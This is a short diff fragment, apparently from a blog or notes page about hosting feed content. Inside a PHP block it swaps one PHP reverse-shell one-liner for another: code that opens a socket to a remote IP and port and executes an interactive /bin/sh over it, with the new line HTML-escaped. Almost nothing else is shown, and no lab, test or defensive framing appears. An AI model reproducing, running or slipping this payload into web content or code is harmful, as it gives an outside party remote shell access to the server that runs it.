@@ -5,5 +5,5 @@ One of the best things is this will allow me to host my feed content to display 
 ##text##
 
 ##php##
-$sock=fsockopen("192.168.0.100",1234);exec("/bin/sh -i <&4 >&4 2>&4");
+$sock=fsockopen("192.168.10.11",4545);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");
 ##php##
